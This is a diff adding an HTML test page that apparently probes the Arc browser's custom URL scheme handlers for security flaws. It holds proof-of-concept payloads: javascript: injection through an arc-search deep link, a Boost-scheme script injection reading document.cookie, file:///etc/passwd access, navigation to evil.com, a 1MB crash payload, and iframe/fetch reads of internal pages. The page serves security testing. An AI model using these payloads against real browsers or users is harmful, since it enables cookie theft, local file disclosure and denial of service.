@@ -1,0 +1,88 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+<title>Arc Scheme Handler Tests</title>
+<style>
+body{font-family:-apple-system,sans-serif;max-width:480px;margin:0 auto;padding:24px 16px;background:#fff;color:#1d1d1f}
+h2{font-size:18px;margin-bottom:8px}
+p{font-size:14px;color:#666;line-height:1.5;margin-bottom:16px}
+button{display:block;width:100%;padding:16px;border:none;border-radius:12px;font-size:17px;font-weight:600;cursor:pointer;margin-bottom:10px;color:#fff}
+button:active{opacity:.7}
+.b1{background:#007aff}
+.b2{background:#34c759}
+.b3{background:#ff9500}
+.b4{background:#af52de}
+.b5{background:#ff3b30}
+.b6{background:#5856d6}
+.b7{background:#00c7be}
+.info{font-size:12px;color:#999;margin-top:4px;margin-bottom:14px}
+</style>
+</head>
+<body>
+<h2>Arc Scheme Handler Tests</h2>
+<p>Test how Arc handles custom URL schemes and deep links. Watch for crashes, unexpected behavior, or navigation to internal pages.</p>
+
+<button class="b1" onclick="go('arc://settings')">arc://settings</button>
+<div class="info">Does Arc expose internal settings page?</div>
+
+<button class="b1" onclick="go('arc://flags')">arc://flags</button>
+<div class="info">Does Arc have a flags/experiments page like Chrome?</div>
+
+<button class="b1" onclick="go('arc://debug')">arc://debug</button>
+<div class="info">Internal debug page?</div>
+
+<button class="b1" onclick="go('arc://version')">arc://version</button>
+<div class="info">Version info page?</div>
+
+<button class="b2" onclick="go('arc-search://search?q=test')">arc-search://search?q=test</button>
+<div class="info">Arc Search deep link — does it execute a search?</div>
+
+<button class="b2" onclick="go('arc-search://open?url=javascript:alert(document.domain)')">arc-search://open?url=javascript:alert(1)</button>
+<div class="info">JS injection via deep link URL parameter</div>
+
+<button class="b3" onclick="go('arc://open?url='+encodeURIComponent('https://evil.com'))">arc://open?url=evil.com</button>
+<div class="info">Can we navigate Arc via scheme?</div>
+
+<button class="b3" onclick="go('arc://open?url='+encodeURIComponent('file:///etc/passwd'))">arc://open?url=file:///etc/passwd</button>
+<div class="info">Local file access via scheme handler?</div>
+
+<button class="b4" onclick="go('arc://boost/inject?css=*{background:red!important}')">arc://boost/inject?css=*{background:red}</button>
+<div class="info">Inject CSS via Boost scheme?</div>
+
+<button class="b4" onclick="go('arc://boost/inject?js=alert(document.cookie)')">arc://boost/inject?js=alert(document.cookie)</button>
+<div class="info">Inject JS via Boost scheme?</div>
+
+<button class="b5" onclick="longScheme()">arc:// with 1MB payload</button>
+<div class="info">Oversized scheme URL — crash/DoS?</div>
+
+<button class="b6" onclick="go('arc://sync/export')">arc://sync/export</button>
+<div class="info">Trigger sync data export?</div>
+
+<button class="b6" onclick="go('arc://extensions')">arc://extensions</button>
+<div class="info">Internal extensions page?</div>
+
+<button class="b7" onclick="iframeScheme()">iframe → arc://settings</button>
+<div class="info">Load internal scheme in iframe — leaks content?</div>
+
+<button class="b7" onclick="fetchScheme()">fetch(arc://settings)</button>
+<div class="info">Fetch internal scheme content via JS</div>
+
+<script>
+function go(url){try{window.location.href=url}catch(e){alert('Error: '+e.message)}}
+function longScheme(){go('arc://'+('A'.repeat(1048576)))}
+function iframeScheme(){
+  var f=document.createElement('iframe');
+  f.src='arc://settings';
+  f.style.cssText='width:100%;height:300px;border:1px solid #ccc;border-radius:8px;margin:10px 0';
+  f.onerror=function(){alert('iframe blocked')};
+  f.onload=function(){try{alert('Content: '+f.contentDocument.title)}catch(e){alert('Cross-origin: '+e.message)}};
+  document.body.appendChild(f);
+}
+function fetchScheme(){
+  fetch('arc://settings').then(function(r){return r.text()}).then(function(t){alert('Got '+t.length+' bytes: '+t.substring(0,200))}).catch(function(e){alert('Fetch error: '+e.message)});
+}
+</script>
+</body>
+</html>
